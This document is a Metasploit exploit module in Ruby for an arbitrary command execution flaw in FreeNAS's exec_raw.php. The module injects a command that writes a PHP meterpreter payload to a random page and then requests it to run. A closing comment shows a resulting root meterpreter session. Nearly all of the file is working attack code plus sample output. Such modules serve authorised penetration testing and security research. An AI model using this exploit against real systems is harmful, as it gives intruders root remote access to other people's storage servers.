##
# $Id: freenas_exec_raw.rb 11127 2010-11-24 19:35:38Z jduck $
###

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FreeNAS exec_raw.php Arbitrary Command Execution',
			'Description'    => %q{
					This module exploits an arbitrary command execution flaw
				in FreeNAS 0.7.2 < rev.5543. When passing a specially formatted URL
				to the exec_raw.php page, an attacker may be able to execute arbitrary
				commands.

				NOTE: This module works best with php/meterpreter payloads.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11127 $',
			'References'     =>
				[
					[ 'URL', 'http://sourceforge.net/projects/freenas/files/stable/0.7.2/NOTES%200.7.2.5543.txt/download' ],
				],
			'Payload'	=>
				{
					'Space'    => 6144,
					'DisableNops' => true,
					'BadChars'    => "`\"' %&x",
				},
			'Targets'	=>
				[
					[ 'Automatic Target', { } ]
				],
			'Privileged' => 'true',
			'Platform' => 'php',
			'Arch' => ARCH_PHP,
			'DisclosureDate' => 'Nov 6 2010',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(80),
			], self.class)
	end

	def exploit

		page = rand_text_alpha_upper(rand(5) + 1 ) + ".php"

		shellcode = payload.encoded

		sploit = "echo \"<?php\n#{shellcode}\n?>\" > #{page}"

		print_status("Sending exploit page '#{page}'")

		res = send_request_raw(
			{
				'uri'	=> "/exec_raw.php?cmd=" + Rex::Text.uri_encode(sploit),
			}, 10)

		if (res and res.code == 200)
			print_status("Triggering payload...")
			send_request_raw({ 'uri' => "/#{page}" }, 5)
			handler
		else
			print_error("Exploit failed.")
			return
		end

	end

end

=begin
meterpreter > sysinfo
Computer: freenas.local
OS      : FreeBSD freenas.local 7.3-RELEASE-p2 FreeBSD 7.3-RELEASE-p2 #0: Sat Jul 31 12:22:04 CEST 2010     root@dev.freenas.org:/usr/obj/freenas/usr/src/sys/FREENAS-i386 i386
meterpreter > getuid
Server username: root (0)
meterpreter >
=end